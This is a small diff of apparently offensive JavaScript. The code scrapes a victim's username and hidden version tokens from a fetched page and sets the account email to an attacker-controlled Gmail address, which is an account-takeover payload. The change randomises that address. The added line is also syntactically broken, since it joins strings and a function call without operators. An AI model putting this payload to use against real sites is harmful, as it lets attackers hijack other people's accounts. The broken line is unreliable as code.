@@ -25,7 +25,12 @@ xhr.onreadystatechange = function () {
             const username =  doc.querySelector('input[id="username"]')?.value || null;
             const object_version_number =  doc.querySelector('input[name="object_version_number"]')?.value || null;
             const email_object_version_number =  doc.querySelector('input[name="email_object_version_number"]')?.value || null;
-            const newemail = "attacker.email123@gmail.com";// Enter new email
+
+            function randomFourDigit() {
+            return Math.floor(Math.random() * 9000) + 1000;
+            }
+
+            const newemail = "attacker.email"randomFourDigit()"@gmail.com";
             const img = new Image();
 
 function finish() {
